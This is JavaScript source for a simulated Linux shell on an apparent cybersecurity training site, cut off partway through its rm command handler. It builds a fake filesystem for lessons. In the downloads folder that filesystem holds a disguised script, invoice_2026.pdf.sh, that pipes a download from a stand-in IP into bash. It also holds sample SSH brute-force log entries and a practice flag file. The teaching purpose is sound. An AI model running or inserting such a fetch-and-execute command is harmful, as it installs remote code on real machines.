/* CyberWithMadhav Learn: a practice Linux shell that runs fully in your browser.
 * Nothing is executed on any real machine and nothing is sent anywhere. Missions are read from a
 * <script type="application/json" class="lx-term-cfg"> block next to each terminal. CSP safe (no eval). */
(function () {
  'use strict';
  var $ = function (s, el) { return (el || document).querySelector(s); };
  var esc = function (s) { return String(s).replace(/[&<>"']/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]; }); };
  var DATE = 'Nov 20 09:41';

  /* ---------- sample system ---------- */
  var AUTH = [
    'Nov 20 08:02:11 cwm-lab sshd[812]: Accepted password for student from 192.168.56.1 port 50122 ssh2',
    'Nov 20 08:15:42 cwm-lab sshd[901]: Failed password for root from 203.0.113.45 port 41022 ssh2',
    'Nov 20 08:15:44 cwm-lab sshd[901]: Failed password for root from 203.0.113.45 port 41022 ssh2',
    'Nov 20 08:15:47 cwm-lab sshd[903]: Failed password for invalid user admin from 203.0.113.45 port 41090 ssh2',
    'Nov 20 08:16:02 cwm-lab sshd[910]: Failed password for invalid user oracle from 198.51.100.7 port 60311 ssh2',
    'Nov 20 08:16:05 cwm-lab sshd[903]: Failed password for invalid user admin from 203.0.113.45 port 41090 ssh2',
    'Nov 20 08:17:30 cwm-lab sudo:  student : TTY=pts/0 ; PWD=/home/student ; USER=root ; COMMAND=/usr/bin/apt update',
    'Nov 20 08:20:13 cwm-lab sshd[922]: Failed password for root from 198.51.100.7 port 60390 ssh2',
    'Nov 20 08:21:55 cwm-lab sshd[930]: Failed password for invalid user test from 203.0.113.45 port 41200 ssh2',
    'Nov 20 08:22:01 cwm-lab sshd[931]: Failed password for root from 203.0.113.45 port 41206 ssh2',
    'Nov 20 08:40:18 cwm-lab sshd[960]: Accepted publickey for student from 192.168.56.1 port 50340 ssh2',
    'Nov 20 08:55:09 cwm-lab sshd[977]: Failed password for student from 192.0.2.88 port 52011 ssh2',
    'Nov 20 09:02:44 cwm-lab CRON[990]: pam_unix(cron:session): session opened for user root by (uid=0)'
  ].join('\n') + '\n';
  var PASSWD = ['root:x:0:0:root:/root:/bin/bash', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
    'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', 'sshd:x:110:65534::/run/sshd:/usr/sbin/nologin', 'student:x:1000:1000:Student,,,:/home/student:/bin/bash',
    'backup_svc:x:1001:1001::/home/backup_svc:/bin/bash'].join('\n') + '\n';
  function baseFS() {
    var F = function (c, mode, owner, group) { return { t: 'f', c: c, m: mode || 420, o: owner || 'root', g: group || owner || 'root' }; };
    var D = function (ch, mode, owner, group) { return { t: 'd', ch: ch || {}, m: mode || 493, o: owner || 'root', g: group || owner || 'root' }; };
    var u = 'student';
    return D({
      bin: D({ bash: F('ELF binary', 493), ls: F('ELF binary', 493), cat: F('ELF binary', 493) }),
      boot: D({ 'vmlinuz': F('Linux kernel image', 384) }),
      dev: D({ 'null': F('', 438), sda: F('', 432, 'root', 'disk') }),
      etc: D({
        hostname: F('cwm-lab\n'), passwd: F(PASSWD), group: F('root:x:0:\nsudo:x:27:student\nstudent:x:1000:\n'),
        shadow: F('root:$y$j9T$...:19700:0:99999:7:::\nstudent:$y$j9T$...:19700:0:99999:7:::\n', 416, 'root', 'shadow'),
        'os-release': F('PRETTY_NAME="Ubuntu 24.04 LTS"\nNAME="Ubuntu"\nVERSION_ID="24.04"\nID=ubuntu\nID_LIKE=debian\n'),
        'sudoers': F('root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n', 288),
        ssh: D({ 'sshd_config': F('Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\n') }),
        'resolv.conf': F('nameserver 127.0.0.53\n'), 'hosts': F('127.0.0.1 localhost\n127.0.1.1 cwm-lab\n'),
        'sysctl.conf': F('# kernel tuning\n'), apt: D({ 'sources.list': F('deb http://archive.ubuntu.com/ubuntu noble main\n') }),
        'ufw': D({ 'ufw.conf': F('ENABLED=no\n') })
      }),
      home: D({
        student: D({
          'notes.txt': F('Lab rules:\n1. Only test machines you own.\n2. Take a VM snapshot before big changes.\n3. Write down every command you learn.\n', 420, u),
          '.bashrc': F('# ~/.bashrc\nalias ll="ls -la"\nexport PATH=$PATH:$HOME/tools\n', 420, u),
          '.mission': F('You found a hidden file. Files that start with a dot are hidden from plain ls.\nNext: make a folder called lab in your home directory.\n', 420, u),
          tools: D({ 'scan.sh': F('#!/bin/bash\n# prints the listening ports on this machine\nss -tuln\n', 420, u) }, 493, u),
          projects: D({ 'README.md': F('# my projects\n', 420, u) }, 493, u),
          downloads: D({ 'invoice_2026.pdf.sh': F('#!/bin/bash\ncurl -s http://198.51.100.7/x | bash\n', 493, u) }, 493, u)
        }, 488, u),
        backup_svc: D({}, 448, 'backup_svc')
      }),
      root: D({ 'flag.txt': F('CWM{r00t_0nly_r34ds_th1s}\n', 384) }, 448),
      tmp: D({}, 1023),
      usr: D({ bin: D({ python3: F('ELF binary', 493), nano: F('ELF binary', 493), ssh: F('ELF binary', 493) }), share: D({}) }),
      'var': D({ log: D({ 'auth.log': F(AUTH, 416, 'syslog', 'adm'), syslog: F('Nov 20 08:00:01 cwm-lab systemd[1]: Started Daily apt download activities.\n', 416, 'syslog', 'adm') }), www: D({ html: D({ 'index.html': F('<h1>It works</h1>\n', 420, 'www-data') }, 493, 'www-data') }) }),
      proc: D({ cpuinfo: F('model name\t: Virtual CPU\ncpu cores\t: 2\n', 292), meminfo: F('MemTotal:        4028760 kB\nMemFree:         2311420 kB\n', 292) })
    });
  }
  var PS = ['USER         PID %CPU %MEM COMMAND', 'root           1  0.0  0.3 /sbin/init', 'root         412  0.0  0.2 /usr/lib/systemd/systemd-journald',
    'syslog       520  0.0  0.1 /usr/sbin/rsyslogd -n', 'root         640  0.0  0.2 sshd: /usr/sbin/sshd -D', 'root         701  0.0  0.1 /usr/sbin/cron -f',
    'www-data     733  0.0  0.4 nginx: worker process', 'student     1201  0.0  0.1 -bash', 'student     1388  0.0  0.0 ps aux'].join('\n');
  var MAN = {
    ls: 'ls: list directory contents. -l long format, -a include hidden files, -h human sizes.', cd: 'cd: change directory. cd .. goes up, cd ~ goes home, cd / goes to the root.',
    pwd: 'pwd: print the full path of the current directory.', cat: 'cat: print file contents.', grep: 'grep: print lines that match a pattern. -i ignore case, -v invert, -c count, -n line numbers.',
    chmod: 'chmod: change permissions. chmod 750 file, or chmod u+x file.', wc: 'wc: count lines (-l), words (-w) and bytes (-c).',
    find: 'find: search for files. find /etc -name "*.conf" or find ~ -type f.', sort: 'sort: sort lines. -n numeric, -r reverse.', uniq: 'uniq: collapse repeated adjacent lines. -c adds counts. Sort first.',
    cut: 'cut: pick columns. cut -d " " -f 11 file.', awk: 'awk: a text-processing language. Here only awk \'{print $N}\' is supported.',
    head: 'head: first lines of a file. head -n 5 file.', tail: 'tail: last lines of a file. tail -n 5 file.', sudo: 'sudo: run one command as root, if you are allowed to.',
    id: 'id: show your user id, group id and groups.', mkdir: 'mkdir: make directories. -p creates parents too.', touch: 'touch: create an empty file or update its time.',
    rm: 'rm: remove files. -r removes folders. There is no recycle bin on Linux.', ps: 'ps: list processes. ps aux shows every process.', echo: 'echo: print text. echo hi > file writes it to a file, >> appends.'
  };

  function Shell(term, cfg) {
    this.term = term; this.cfg = cfg; this.out = $('.lx-term-out', term); this.input = $('input', term); this.label = $('.lx-term-in label', term);
    this.mlist = $('.lx-missions ol', term); this.hist = []; this.hi = 0; this.reset();
    var self = this;
    this.input.addEventListener('keydown', function (e) { self.key(e); });
    $('.lx-term-out', term).addEventListener('click', function () { if (!window.getSelection().toString()) self.input.focus(); });
    var rb = $('[data-reset]', term); if (rb) rb.addEventListener('click', function () { self.reset(); self.input.focus(); });
  }
  Shell.prototype.reset = function () {
    this.fs = baseFS(); this.user = 'student'; this.home = '/home/student'; this.cwd = this.home; this.mi = 0; this.last = { cmd: '', out: '', argv: [] };
    this.out.innerHTML = ''; (this.cfg.intro || []).forEach(function (l) { this.print(l, 'dim'); }, this);
    this.print('Type help to see the commands. Use the Up arrow for history and Tab to complete names.', 'dim');
    this.renderMissions(); this.prompt();
  };
  Shell.prototype.prompt = function () {
    var p = this.cwd === this.home ? '~' : this.cwd.indexOf(this.home + '/') === 0 ? '~' + this.cwd.slice(this.home.length) : this.cwd;
    this.label.innerHTML = esc(this.user + '@cwm-lab') + ':<b>' + esc(p) + '</b>' + (this.user === 'root' ? '#' : '$');
    this.ps = this.label.innerHTML;
  };
  Shell.prototype.print = function (t, cls) {
    var d = document.createElement('div'); if (cls) d.className = cls; d.textContent = t; this.out.appendChild(d); this.out.scrollTop = this.out.scrollHeight;
  };
  Shell.prototype.printHTML = function (h) { var d = document.createElement('div'); d.innerHTML = h; this.out.appendChild(d); this.out.scrollTop = this.out.scrollHeight; };
  Shell.prototype.renderMissions = function () {
    var ms = this.cfg.missions || [], self = this;
    if (!this.mlist) return;
    this.mlist.innerHTML = ms.map(function (m, i) {
      var st = i < self.mi ? 'done' : i === self.mi ? 'cur' : '';
      return '<li class="' + st + '"' + (st === 'cur' ? ' aria-current="step"' : '') + '><span>' + m.t + '</span>' + (st === 'cur' && m.hint ? '<button type="button" data-hint="' + i + '">Hint</button><span class="lx-mhint" hidden>' + m.hint + '</span>' : '') + '</li>';
    }).join('') + (this.mi >= ms.length && ms.length ? '<li class="done">All missions complete. You can keep exploring freely.</li>' : '');
    var hb = $('[data-hint]', this.mlist); if (hb) hb.addEventListener('click', function () { hb.nextElementSibling.hidden = false; hb.remove(); });
    var c = $('.lx-mcount', this.term); if (c) c.textContent = Math.min(this.mi, ms.length) + '/' + ms.length;
  };

  /* ---------- filesystem helpers ---------- */
  Shell.prototype.abs = function (p) {
    if (!p || p === '~') return this.home;
    if (p.indexOf('~/') === 0) p = this.home + p.slice(1);
    var parts = (p[0] === '/' ? p : this.cwd + '/' + p).split('/'), st = [];
    parts.forEach(function (x) { if (!x || x === '.') return; if (x === '..') st.pop(); else st.push(x); });
    return '/' + st.join('/');
  };
  Shell.prototype.node = function (p) { var n = this.fs; if (p === '/') return n; var ps = p.split('/').slice(1); for (var i = 0; i < ps.length; i++) { if (!n || n.t !== 'd') return null; n = n.ch[ps[i]]; } return n || null; };
  Shell.prototype.parent = function (p) { var i = p.lastIndexOf('/'); return { dir: this.node(p.slice(0, i) || '/'), name: p.slice(i + 1) }; };
  Shell.prototype.can = function (n, bit) { /* bit 4 read, 2 write, 1 exec */
    if (this.user === 'root') return true;
    var sh = n.o === this.user ? 6 : ['student', 'adm', 'sudo'].indexOf(n.g) > -1 ? 3 : 0;
    return !!((n.m >> sh) & bit);
  };
  Shell.prototype.err = function (msg) { var e = new Error(msg); e.sh = true; throw e; };
  Shell.prototype.readFile = function (cmd, p) {
    var a = this.abs(p), n = this.node(a);
    if (!n) this.err(cmd + ': ' + p + ': No such file or directory');
    if (n.t === 'd') this.err(cmd + ': ' + p + ': Is a directory');
    if (!this.can(n, 4)) this.err(cmd + ': ' + p + ': Permission denied');
    return n.c;
  };
  Shell.prototype.writeFile = function (cmd, p, text, append) {
    var a = this.abs(p), n = this.node(a);
    if (n && n.t === 'd') this.err(cmd + ': ' + p + ': Is a directory');
    if (n) { if (!this.can(n, 2)) this.err(cmd + ': ' + p + ': Permission denied'); n.c = append ? n.c + text : text; return; }
    var pr = this.parent(a);
    if (!pr.dir || pr.dir.t !== 'd') this.err(cmd + ': ' + p + ': No such file or directory');
    if (!this.can(pr.dir, 2)) this.err(cmd + ': ' + p + ': Permission denied');
    pr.dir.ch[pr.name] = { t: 'f', c: text, m: 436, o: this.user, g: this.user };
  };
  var mstr = function (n) { var s = n.t === 'd' ? 'd' : '-'; for (var i = 6; i >= 0; i -= 3) { var b = (n.m >> i) & 7; s += (b & 4 ? 'r' : '-') + (b & 2 ? 'w' : '-') + (b & 1 ? 'x' : '-'); } if (n.m & 512) s = s.slice(0, 9) + 't'; return s; };
  var size = function (n) { return n.t === 'd' ? 4096 : n.c.length; };

  /* ---------- parsing ---------- */
  function tokenize(line) {
    var out = [], cur = '', q = null, has = false;
    for (var i = 0; i < line.length; i++) {
      var c = line[i];
      if (q) { if (c === q) q = null; else cur += c; continue; }
      if (c === '"' || c === "'") { q = c; has = true; continue; }
      if (c === ' ' || c === '\t') { if (cur || has) out.push(cur); cur = ''; has = false; continue; }
      if (c === '|' || c === ';' || c === '>' || c === '&') {
        if (cur || has) out.push(cur); cur = ''; has = false;
        if (c === '>' && line[i + 1] === '>') { out.push({ op: '>>' }); i++; }
        else if (c === '&' && line[i + 1] === '&') { out.push({ op: '&&' }); i++; }
        else if (c === '|' && line[i + 1] === '|') { out.push({ op: '||' }); i++; }
        else out.push({ op: c });
        continue;
      }
      cur += c;
    }
    if (q) throw Object.assign(new Error('bash: unexpected end of input: missing closing quote'), { sh: true });
    if (cur || has) out.push(cur);
    return out;
  }

  Shell.prototype.key = function (e) {
    var self = this;
    if (e.key === 'Enter') { var v = this.input.value; this.input.value = ''; this.run(v); }
    else if (e.key === 'ArrowUp') { if (this.hi > 0) { this.hi--; this.input.value = this.hist[this.hi]; } e.preventDefault(); }
    else if (e.key === 'ArrowDown') { if (this.hi < this.hist.length) { this.hi++; this.input.value = this.hist[this.hi] || ''; } e.preventDefault(); }
    else if (e.key === 'Tab') {
      e.preventDefault();
      var v2 = this.input.value, m = v2.match(/(\S*)$/), part = m[1], slash = part.lastIndexOf('/');
      var dirp = slash > -1 ? part.slice(0, slash + 1) : '', base = part.slice(slash + 1), d = this.node(this.abs(dirp || '.'));
      if (!d || d.t !== 'd') return;
      var hits = Object.keys(d.ch).filter(function (k) { return k.indexOf(base) === 0 && (base[0] === '.' || k[0] !== '.'); });
      if (hits.length === 1) { var n = d.ch[hits[0]]; this.input.value = v2.slice(0, v2.length - part.length) + dirp + hits[0] + (n.t === 'd' ? '/' : ' '); }
      else if (hits.length > 1) { this.printHTML('<span class="pr">' + this.ps + '</span> ' + esc(v2)); this.print(hits.join('  ')); }
    } else if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); self.out.innerHTML = ''; }
  };

  Shell.prototype.run = function (line) {
    this.printHTML('<span class="pr">' + this.ps + '</span> ' + esc(line));
    line = line.slice(0, 400).trim();
    if (!line) return;
    this.hist.push(line); this.hi = this.hist.length;
    var toks;
    try { toks = tokenize(line); } catch (e) { this.print(e.message, 'er'); return; }
    var self = this, groups = [[]], seps = [];
    toks.forEach(function (t) { if (t.op === ';' || t.op === '&&' || t.op === '||') { seps.push(t.op); groups.push([]); } else groups[groups.length - 1].push(t); });
    var ok = true;
    for (var g = 0; g < groups.length; g++) {
      if (g > 0 && ((seps[g - 1] === '&&' && !ok) || (seps[g - 1] === '||' && ok))) continue;
      if (!groups[g].length) continue;
      ok = this.pipeline(groups[g], line);
    }
    this.prompt(); this.check(line);
  };

  Shell.prototype.pipeline = function (toks, line) {
    var stages = [[]], redir = null, self = this;
    for (var i = 0; i < toks.length; i++) {
      var t = toks[i];
      if (t.op === '|') stages.push([]);
      else if (t.op === '>' || t.op === '>>') { redir = { file: toks[i + 1], app: t.op === '>>' }; i++; }
      else if (t.op === '&') { /* background: ignore */ }
      else stages[stages.length - 1].push(t);
    }
    var data = null, dirs = null, okAll = true;
    try {
      if (redir && (typeof redir.file !== 'string' || !redir.file)) this.err('bash: syntax error near unexpected token `newline\'');
      stages.forEach(function (argv, k) {
        if (!argv.length) self.err('bash: syntax error near unexpected token `|\'');
        argv = argv.map(function (a) { return a.replace(/\$HOME|\$USER|\$PWD/g, function (v) { return v === '$HOME' ? self.home : v === '$USER' ? self.user : self.cwd; }); });
        var r = self.exec(argv, data);
        data = r == null ? '' : typeof r === 'object' ? r.text : r;
        dirs = typeof r === 'object' && r ? r.dirs : null;
        if (k === 0) self.last.argv = argv;
      });
      if (redir) { this.writeFile('bash', redir.file, data && !/\n$/.test(data) ? data + '\n' : data, redir.app); data = ''; }
    } catch (e) {
      if (!e.sh) throw e;
      this.print(e.message, 'er'); okAll = false; data = '';
    }
    this.last.cmd = line; this.last.out = (data || '').trim();
    if (data) {
      var txt = data.replace(/\n$/, '');
      if (dirs && dirs.length) this.printHTML(esc(txt).replace(new RegExp('(^|\\s)(' + dirs.map(function (d) { return esc(d).replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }).join('|') + ')(?=\\s|$)', 'gm'), '$1<span class="dir">$2</span>'));
      else this.print(txt);
    }
    if (this.user === 'root' && this.sudoOnce) { this.user = 'student'; this.sudoOnce = false; }
    return okAll;
  };

  Shell.prototype.exec = function (argv, stdin) {
    var self = this, cmd = argv[0], args = argv.slice(1);
    var flags = function (allowed) { var f = {}, rest = []; args.forEach(function (a) { if (/^-[a-zA-Z]+$/.test(a)) a.slice(1).split('').forEach(function (c) { f[c] = true; }); else rest.push(a); }); return { f: f, r: rest }; };
    var input = function (files, name) { return files.length ? files.map(function (p) { return self.readFile(name, p); }).join('') : (stdin == null ? '' : stdin); };
    var lines = function (s) { var l = s.split('\n'); if (l[l.length - 1] === '') l.pop(); return l; };
    var numOpt = function (def) { var n = def, rest = []; for (var i = 0; i < args.length; i++) { if (args[i] === '-n') { n = +args[++i]; } else if (/^-\d+$/.test(args[i])) n = +args[i].slice(1); else rest.push(args[i]); } return { n: n, r: rest }; };
    switch (cmd) {
      case 'help': return 'Practice shell commands:\n  pwd ls cd cat head tail less wc grep sort uniq cut awk find file\n  mkdir touch cp mv rm rmdir echo chmod chown stat\n  whoami id groups hostname uname date uptime ps df free ip ss history clear\n  sudo man which answer\nPipes (|), redirects (>, >>), && and ; work. Type man <command> for a short description.';
      case 'clear': this.out.innerHTML = ''; return '';
      case 'pwd': return this.cwd;
      case 'whoami': return this.user;
      case 'hostname': return 'cwm-lab';
      case 'id': return this.user === 'root' ? 'uid=0(root) gid=0(root) groups=0(root)' : 'uid=1000(student) gid=1000(student) groups=1000(student),4(adm),27(sudo)';
      case 'groups': return this.user === 'root' ? 'root' : 'student adm sudo';
      case 'uname': return args.indexOf('-a') > -1 ? 'Linux cwm-lab 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 GNU/Linux' : args.indexOf('-r') > -1 ? '6.8.0-45-generic' : 'Linux';
      case 'date': return new Date().toString().replace(/ GMT.*$/, '');
      case 'uptime': return ' 09:41:07 up 1:39,  1 user,  load average: 0.08, 0.05, 0.01';
      case 'ps': return PS;
      case 'top': case 'htop': return 'top is interactive and needs a real terminal. Try ps aux here.';
      case 'df': return 'Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda2        25G  7.9G   16G  34% /\ntmpfs           393M  1.2M  392M   1% /run';
      case 'free': return '               total        used        free      shared  buff/cache   available\nMem:           3.8Gi       1.1Gi       2.2Gi        12Mi       790Mi       2.7Gi\nSwap:          2.0Gi          0B       2.0Gi';
      case 'ip': return '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic enp0s3\n3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 192.168.56.101/24 brd 192.168.56.255 scope global enp0s8';
      case 'ss': case 'netstat': return 'Netid State  Local Address:Port  Peer Address:Port\ntcp   LISTEN 0.0.0.0:22          0.0.0.0:*\ntcp   LISTEN 0.0.0.0:80          0.0.0.0:*\nudp   UNCONN 127.0.0.53:53       0.0.0.0:*';
      case 'history': return this.hist.map(function (h, i) { return String(i + 1).padStart(5) + '  ' + h; }).join('\n');
      case 'echo': return args.join(' ');
      case 'man': return args[0] ? (MAN[args[0]] || 'No manual entry for ' + args[0] + ' in this practice shell.') : 'What manual page do you want? Try man grep';
      case 'which': return args.map(function (a) { return MAN[a] || ['bash', 'ls', 'cat'].indexOf(a) > -1 ? '/usr/bin/' + a : ''; }).filter(Boolean).join('\n');
      case 'nano': case 'vim': case 'vi': return 'Editors need a real terminal. Here, write files with echo "text" > file and add lines with >>.';
      case 'exit': case 'logout': return 'This practice shell stays open. Use the Reset button to start fresh.';
      case 'apt': case 'apt-get': return this.user === 'root' ? 'Package installs need the internet, so they are disabled in this practice shell. Do this step on your own VM.' : 'E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Are you root? Try sudo.';
      case 'ssh': case 'curl': case 'wget': case 'ping': case 'nmap': return cmd + ': network commands are off in this browser shell. Practise them on your own lab VMs.';
      case 'sudo': {
        if (!args.length) return 'usage: sudo <command>';
        if (args[0] === '-i' || args[0] === 'su') { this.user = 'root'; this.cwd = '/root'; return '[sudo] practice shell: password step skipped.\nYou are now root. Be careful. Type sudo -k to go back to student.'; }
        if (args[0] === '-k') { this.user = 'student'; this.cwd = this.home; return ''; }
        var prev = this.user; this.user = 'root';
        try { var r = this.exec(args, stdin); } finally { this.user = prev; }
        return r;
      }
      case 'su': return 'su: Authentication failure (practice shell). Use sudo for one command.';
      case 'cd': {
        var to = this.abs(args[0] || '~'), n = this.node(to);
        if (!n) this.err('bash: cd: ' + args[0] + ': No such file or directory');
        if (n.t !== 'd') this.err('bash: cd: ' + args[0] + ': Not a directory');
        if (!this.can(n, 1)) this.err('bash: cd: ' + args[0] + ': Permission denied');
        this.cwd = to; return '';
      }
      case 'ls': case 'll': {
        var o = flags(), paths = o.r.length ? o.r : ['.'], outp = [], dl = [];
        if (cmd === 'll') { o.f.l = true; o.f.a = true; }
        paths.forEach(function (p) {
          var a = self.abs(p), n = self.node(a);
          if (!n) self.err("ls: cannot access '" + p + "': No such file or directory");
          if (n.t !== 'd') { outp.push(o.f.l ? row(p, n) : p); return; }
          if (!self.can(n, 4)) self.err("ls: cannot open directory '" + p + "': Permission denied");
          var names = Object.keys(n.ch).sort().filter(function (k) { return o.f.a || k[0] !== '.'; });
          if (o.f.a) names = ['.', '..'].concat(names);
          if (paths.length > 1) outp.push(p + ':');
          if (o.f.l) { outp.push('total ' + names.length * 4); names.forEach(function (k) { var c = k === '.' ? n : k === '..' ? (self.node(self.abs(p + '/..')) || n) : n.ch[k]; if (c.t === 'd') dl.push(k); outp.push(row(k, c)); }); }
          else { names.forEach(function (k) { var c = k === '.' || k === '..' ? n : n.ch[k]; if (c.t === 'd') dl.push(k); }); outp.push(names.join('  ')); }
        });
        function row(name, n) { var s = size(n); return mstr(n) + ' ' + (n.t === 'd' ? 2 : 1) + ' ' + n.o.padEnd(8) + ' ' + n.g.padEnd(8) + ' ' + (o.f.h && s >= 1024 ? (s / 1024).toFixed(1) + 'K' : String(s)).padStart(5) + ' ' + DATE + ' ' + name; }
        return { text: outp.join('\n'), dirs: dl };
      }
      case 'cat': case 'less': case 'more': return input(args.filter(function (a) { return a[0] !== '-'; }), cmd);
      case 'head': case 'tail': { var h = numOpt(10), L = lines(input(h.r, cmd)); return (cmd === 'head' ? L.slice(0, h.n) : L.slice(Math.max(0, L.length - h.n))).join('\n'); }
      case 'wc': {
        var w = flags(), txt = input(w.r, 'wc'), nl = (txt.match(/\n/g) || []).length + (txt && txt.slice(-1) !== '\n' ? 1 : 0), nw = (txt.match(/\S+/g) || []).length, nb = txt.length;
        var parts = w.f.l || w.f.w || w.f.c ? [w.f.l ? nl : null, w.f.w ? nw : null, w.f.c ? nb : null].filter(function (x) { return x !== null; }) : [nl, nw, nb];
        return parts.join(' ') + (w.r.length ? ' ' + w.r.join(' ') : '');
      }
      case 'grep': {
        var gf = flags(), pat = gf.r[0], files = gf.r.slice(1);
        if (pat == null) this.err('Usage: grep [OPTION]... PATTERNS [FILE]...');
        var re; try { re = new RegExp(pat, gf.f.i ? 'i' : ''); } catch (e) { re = new RegExp(pat.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), gf.f.i ? 'i' : ''); }
        var res = [];
        var srcs = files.length ? files.map(function (f) { return [f, self.readFile('grep', f)]; }) : [['', stdin || '']];
        srcs.forEach(function (s) { lines(s[1]).forEach(function (l, i) {
          if (re.test(l) === !!gf.f.v) return;
          var pre = (files.length > 1 ? s[0] + ':' : '') + (gf.f.n ? (i + 1) + ':' : '');
          if (gf.f.o && !gf.f.v) { var g = new RegExp(re.source, re.flags + 'g'), mt; while ((mt = g.exec(l)) && mt[0]) res.push(pre + mt[0]); }
          else res.push(pre + l);
        }); });
        return gf.f.c ? String(res.length) : res.join('\n');
      }
      case 'sort': { var sf = flags(), SL = lines(input(sf.r, 'sort')); SL.sort(sf.f.n ? function (a, b) { return parseFloat(a) - parseFloat(b); } : undefined); if (sf.f.r) SL.reverse(); if (sf.f.u) SL = SL.filter(function (x, i) { return SL.indexOf(x) === i; }); return SL.join('\n'); }
      case 'uniq': {
        var uf = flags(), UL = lines(input(uf.r, 'uniq')), out2 = [], prev2 = null, cnt = 0;
        UL.concat([null]).forEach(function (l) { if (l === prev2) { cnt++; return; } if (prev2 !== null) out2.push(uf.f.c ? String(cnt).padStart(7) + ' ' + prev2 : prev2); prev2 = l; cnt = 1; });
        return out2.join('\n');
      }
      case 'cut': {
        var d = '\t', fl = null, rest2 = [];
        for (var i = 0; i < args.length; i++) { var a = args[i]; if (a === '-d') d = args[++i]; else if (/^-d./.test(a)) d = a.slice(2); else if (a === '-f') fl = args[++i]; else if (/^-f/.test(a)) fl = a.slice(2); else rest2.push(a); }
        if (!fl) this.err('cut: you must specify a list of fields');
        var fs = fl.split(',').map(Number);
        return lines(input(rest2, 'cut')).map(function (l) { var p = l.split(d); return fs.map(function (f) { return p[f - 1] || ''; }).join(d); }).join('\n');
      }
      case 'awk': {
        var sep = null, prog = null, af = [];
        for (var j = 0; j < args.length; j++) { if (args[j] === '-F') sep = args[++j]; else if (/^-F./.test(args[j])) sep = args[j].slice(2); else if (prog === null) prog = args[j]; else af.push(args[j]); }
        var m = /^\{\s*print\s+((?:\$\d+|NF|\$NF|\$\(NF-\d+\))(?:\s*,\s*(?:\$\d+|\$NF|\$\(NF-\d+\)))*)\s*\}$/.exec(prog || '');
        if (!m) this.err("awk: this practice shell only supports print with fields, like awk '{print $1}' or awk '{print $(NF-3)}'");
        var cols = m[1].split(',').map(function (s) { return s.trim(); });
        return lines(input(af, 'awk')).map(function (l) { var p = sep ? l.split(sep) : l.trim().split(/\s+/); return cols.map(function (c) { var k = /^\$\(NF-(\d+)\)$/.exec(c); if (k) return p[p.length - 1 - +k[1]] || ''; return c === '$NF' ? p[p.length - 1] : c === 'NF' ? String(p.length) : (+c.slice(1) === 0 ? l : p[+c.slice(1) - 1] || ''); }).join(' '); }).join('\n');
      }
      case 'find': {
        var start = args[0] && args[0][0] !== '-' ? args[0] : '.', name = null, type = null, res2 = [];
        for (var k = 0; k < args.length; k++) { if (args[k] === '-name' || args[k] === '-iname') name = args[++k]; else if (args[k] === '-type') type = args[++k]; }
        var rx = name ? new RegExp('^' + name.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$', 'i') : null;
        var root = this.node(this.abs(start)); if (!root) this.err("find: '" + start + "': No such file or directory");
        var errs = [];
        (function walk(n, p, nm) {
          if ((!rx || rx.test(nm)) && (!type || (type === 'd') === (n.t === 'd'))) res2.push(p);
          if (n.t === 'd') { if (!self.can(n, 4)) { errs.push("find: '" + p + "': Permission denied"); return; } Object.keys(n.ch).sort().forEach(function (c) { walk(n.ch[c], (p === '/' ? '' : p) + '/' + c, c); }); }
        })(root, start, start.split('/').pop() || '/');
        return res2.concat(errs).join('\n');
      }
      case 'file': return args.map(function (p) { var n = self.node(self.abs(p)); if (!n) return p + ': cannot open'; if (n.t === 'd') return p + ': directory'; if (/^#!\/bin\/(ba)?sh/.test(n.c)) return p + ': Bourne-Again shell script, ASCII text executable'; if (n.c === 'ELF binary') return p + ': ELF 64-bit LSB pie executable, x86-64'; return p + ': ASCII text'; }).join('\n');
      case 'stat': return args.map(function (p) { var n = self.node(self.abs(p)); if (!n) self.err("stat: cannot statx '" + p + "': No such file or directory"); return '  File: ' + p + '\n  Size: ' + size(n) + '\nAccess: (0' + (n.m & 511).toString(8) + '/' + mstr(n) + ')  Uid: ' + n.o + '  Gid: ' + n.g; }).join('\n');
      case 'mkdir': {
        var mf = flags();
        mf.r.forEach(function (p) {
          var a = self.abs(p);
          if (self.node(a)) { if (!mf.f.p) self.err("mkdir: cannot create directory '" + p + "': File exists"); return; }
          var segs = a.split('/').slice(1), cur = '';
          segs.forEach(function (s, i) {
            cur += '/' + s; var ex = self.node(cur);
            if (ex) return;
            if (i < segs.length - 1 && !mf.f.p) self.err("mkdir: cannot create directory '" + p + "': No such file or directory");
            var pr = self.parent(cur); if (!self.can(pr.dir, 2)) self.err("mkdir: cannot create directory '" + p + "': Permission denied");
            pr.dir.ch[pr.name] = { t: 'd', ch: {}, m: 509, o: self.user, g: self.user };
          });
        });
        return '';
      }
      case 'touch': args.forEach(function (p) { if (!self.node(self.abs(p))) self.writeFile('touch', p, '', false); }); return '';
      case 'rm': case 'rmdir': {
        var rf = flags();
        rf.r.forEach(function (p) {
          var a = self.abs(p), n = self.node(a);
          if (!n) { if (!rf.f.f) self.err("rm: cannot remove '" + p + "': No such file or directory"); return; }
          if (a === '/' || a === self.home) self.err("rm: refusing to remove '" + p + "' in the practice shell");
          if (n.t === 'd' && cmd === 'rm' && !rf.f.r) self.err("rm: cannot remove '" + p + "': Is a directory");
          if (n.t === 'd' && cmd === 'rmdir' && Object.keys(n.ch).length) self.err("rmdir: failed to remove '" + p + "': Directory not empty");
          var pr = self.parent(a); if (!self.can(pr.dir, 2)) self.err("rm: cannot remove '" + p + "': Permission denied");
